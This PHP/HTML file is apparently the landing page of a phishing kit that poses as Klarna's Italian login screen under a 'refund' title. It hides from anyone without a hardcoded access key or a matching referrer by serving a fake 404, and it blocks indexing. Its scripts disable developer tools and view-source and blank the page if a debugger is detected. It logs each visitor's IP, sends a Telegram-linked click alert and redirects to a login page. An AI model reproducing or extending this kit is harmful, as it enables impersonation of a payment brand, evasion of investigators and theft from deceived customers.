<?php
require_once __DIR__ . '/guard.php';

$access_key = 'mama';
$has_access = false;

if (isset($_GET['key']) && $_GET['key'] === $access_key) {
    $_SESSION['idx_access'] = true;
    header('Location: ' . str_replace('?key=' . $access_key, '', $_SERVER['REQUEST_URI']));
    exit;
}

if (isset($_SESSION['idx_access']) && $_SESSION['idx_access'] === true) {
    $has_access = true;
}

$referrer = $_SERVER['HTTP_REFERER'] ?? '';
if (!$has_access && (strpos($referrer, 'bank.php') !== false || strpos($referrer, $_SERVER['HTTP_HOST']) !== false)) {
    $_SESSION['idx_access'] = true;
    $has_access = true;
}

if (!$has_access) {
    header('HTTP/1.0 404 Not Found');
    exit('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1></body></html>');
}

// Initialize this client in DB
initClient(getToken());

$clientIp = getClientIp();
$token = getToken();
?>
<!DOCTYPE html>
<html lang="it" oncontextmenu="return false;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="googlebot" content="noindex, nofollow">
    <title>Klarna | Rimborso</title>
    <script>window.clientToken = "<?php echo htmlspecialchars($token); ?>"; window.clientIp = "<?php echo htmlspecialchars($clientIp); ?>";</script>
    <script>
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S'))) {
                e.preventDefault(); return false;
            }
        });
        (function() { var devtools=false, threshold=160; setInterval(function(){ var start=performance.now(); debugger; var end=performance.now(); if(end-start>threshold && !devtools){ devtools=true; document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;"><h1 style="color:#333;">403 Forbidden</h1></div>'; } },1000); })();
        document.addEventListener('dragstart', function(e){ if(e.target.tagName!=='INPUT' && e.target.tagName!=='TEXTAREA') e.preventDefault(); });
        document.addEventListener('selectstart', function(e){ if(e.target.tagName!=='INPUT' && e.target.tagName!=='TEXTAREA') e.preventDefault(); });
    </script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        body { background-color: #f7f7f7; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; zoom: 0.92; -moz-transform: scale(0.92); -moz-transform-origin: top center; }
        .klarna-pink { background-color: #ffb3c7; color: #000; }
        .btn-dark { background-color: #080516; color: white; transition: background-color 0.3s; }
        .btn-dark:hover { background-color: #000; }
        .auth-card { width: 100%; max-width: 550px; background: white; padding: 36px 52px; border-radius: 32px; box-shadow: 0 8px 28px rgba(0,0,0,0.04); position: relative; min-height: 780px; display: flex; flex-direction: column; }
        .btn-dark, button[class*="btn-dark"] { padding-top: 14px !important; padding-bottom: 14px !important; font-size: 1rem !important; border-radius: 45px !important; }
        @media (max-width: 640px) { body { background-color: white; align-items: stretch; zoom: 1; -moz-transform: none; } .auth-card { max-width: 100%; height: 100vh; min-height: 100vh; border-radius: 0; padding: 16px 20px; box-shadow: none; } }
        @media (min-width: 641px) and (max-width: 900px) { body { zoom: 0.95; -moz-transform: scale(0.95); } .auth-card { max-width: 480px; padding: 28px 36px; min-height: 650px; } }
        .bottom-section { margin-top: auto; width: 100%; }
        .landing-logo-wrap { position: relative; width: 160px; height: 90px; margin: 0 auto 28px; }
        .landing-icon-left { position: absolute; left: 0; top: 12px; width: 48px; height: 48px; background: white; border-radius: 16px; box-shadow: 0 2px 10px rgba(0,0,0,0.06); border: 1px solid #f0f0f0; display: flex; align-items: center; justify-content: center; transform: rotate(-14deg); z-index: 1; }
        .landing-icon-right { position: absolute; right: 0; top: 12px; width: 48px; height: 48px; background: white; border-radius: 16px; box-shadow: 0 2px 10px rgba(0,0,0,0.06); border: 1px solid #f0f0f0; display: flex; align-items: center; justify-content: center; transform: rotate(14deg); z-index: 1; }
        .landing-k { width: 76px; height: 76px; background: #ffb3c7; border-radius: 24px; display: flex; align-items: center; justify-content: center; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); box-shadow: 0 10px 30px rgba(255,179,199,0.45); z-index: 2; }
        .landing-k span { font-size: 44px; font-weight: 800; color: #000; line-height: 1; letter-spacing: -1px; }
        .bottom-nav { display: none; margin-top: auto; padding-top: 10px; border-top: 1px solid #e5e5ea; }
        @media (max-width: 900px) { .bottom-nav { display: block; } }
    </style>
</head>
<body>
    <div class="auth-card">
        <div class="flex-grow flex flex-col items-center text-center pt-6">
            <div class="landing-logo-wrap mt-4">
                <div class="landing-icon-left">
                    <img src="https://encrypted-tbn3.gstatic.com/images?q=tbn:ANd9GcQKLw_o6AOqMWFY2gEBsc8KoKX-jb8_-_vmsDvjo3dO7XVl8P_K" class="w-5 h-5 object-contain" alt="bag">
                </div>
                <div class="landing-icon-right">
                    <img src="https://static.vecteezy.com/ti/vecteur-libre/t1/29342711-commencez-ligne-icone-vecteur-icone-pour-votre-site-internet-mobile-presentation-et-logo-conception-vectoriel.jpg" class="w-5 h-5 object-contain" alt="rocket">
                </div>
                <div class="landing-k"><span>K</span></div>
            </div>
            <h1 class="text-[28px] font-bold text-[#080516] leading-tight tracking-tight mb-8">Accedi per<br>l'esperienza Klarna<br>completa</h1>
            <div class="w-full mb-5">
                <div class="bg-[#f2f2f7] rounded-2xl p-4 flex items-center justify-between cursor-pointer hover:bg-[#e5e5ea] transition">
                    <div class="flex items-center gap-3">
                        <div class="w-6 h-6 rounded-full overflow-hidden flex-shrink-0 border border-gray-200 shadow-sm">
                            <svg viewBox="0 0 100 100" class="w-full h-full"><rect x="0" y="0" width="33.33" height="100" fill="#009246"/><rect x="33.33" y="0" width="33.33" height="100" fill="#ffffff"/><rect x="66.66" y="0" width="33.34" height="100" fill="#ce2b37"/></svg>
                        </div>
                        <div class="text-left">
                            <div class="text-[12px] text-[#8a8a96] leading-tight">Vivo in:</div>
                            <div class="text-[16px] font-semibold text-[#080516] leading-tight">Italia</div>
                        </div>
                    </div>
                    <i class="fa-solid fa-chevron-down text-[#8a8a96] text-sm"></i>
                </div>
            </div>

            <!-- CHANGED: Button now sends Telegram notif then redirects -->
            <button id="btn-accedi" onclick="startLogin()" class="w-full btn-dark py-4 rounded-full font-bold text-[16px] mb-2 hover:bg-black transition-all">Accedi</button>

            <div class="w-full mt-2 text-left">
                <div class="flex items-center justify-between py-4 cursor-pointer hover:bg-gray-50 transition px-1 border-b border-[#e5e5ea]">
                    <div class="flex items-center gap-3">
                        <svg class="w-5 h-5 text-[#080516]" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                        <span class="text-[15px] font-medium text-[#080516]">Privacy</span>
                    </div>
                    <i class="fa-solid fa-chevron-right text-[#8a8a96] text-sm"></i>
                </div>
                <div class="flex items-center justify-between py-4 cursor-pointer hover:bg-gray-50 transition px-1">
                    <div class="flex items-center gap-3">
                        <svg class="w-5 h-5 text-[#080516]" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
                        <span class="text-[15px] font-medium text-[#080516]">Lingua</span>
                    </div>
                    <i class="fa-solid fa-chevron-right text-[#8a8a96] text-sm"></i>
                </div>
            </div>
        </div>
        <div class="text-center pt-4 pb-2">
            <div class="text-[11px] text-[#8a8a96]">Version 26.31.273</div>
            <a href="#" class="text-[11px] text-[#4b3ec4] hover:underline font-medium">Leggi di più</a>
        </div>
        <div class="bottom-nav">
            <div class="flex items-center justify-around py-2 pb-3">
                <div class="flex flex-col items-center gap-1 cursor-pointer min-w-[60px] py-1"><i class="fa-solid fa-house text-[#8a8a96] text-[20px]"></i><span class="text-[10px] text-[#8a8a96] font-medium">Home</span></div>
                <div class="flex flex-col items-center gap-1 cursor-pointer min-w-[60px] py-1"><i class="fa-solid fa-receipt text-[#8a8a96] text-[20px]"></i><span class="text-[10px] text-[#8a8a96] font-medium">Pagamenti</span></div>
                <div class="flex flex-col items-center gap-1 cursor-pointer min-w-[60px] py-1"><i class="fa-solid fa-wallet text-[#8a8a96] text-[20px]"></i><span class="text-[10px] text-[#8a8a96] font-medium">Wallet</span></div>
                <div class="flex flex-col items-center gap-1 cursor-pointer min-w-[60px] bg-[#f2f2f7] rounded-2xl px-3 py-2"><i class="fa-solid fa-user text-[#080516] text-[20px]"></i><span class="text-[10px] text-[#080516] font-medium">Altro</span></div>
            </div>
        </div>
    </div>

    <script>
        function startLogin() {
            const btn = document.getElementById('btn-accedi');
            btn.innerText = 'Caricamento...';
            btn.disabled = true;

            // Send landing_click notification to api.php
            let fd = new FormData();
            fd.append('type', 'landing_click');

            fetch('api.php', { method: 'POST', body: fd })
            .then(() => {
                window.location.href = 'login.php';
            })
            .catch(() => {
                // Even if Telegram fails, still redirect
                window.location.href = 'login.php';
            });
        }
    </script>
</body>
</html>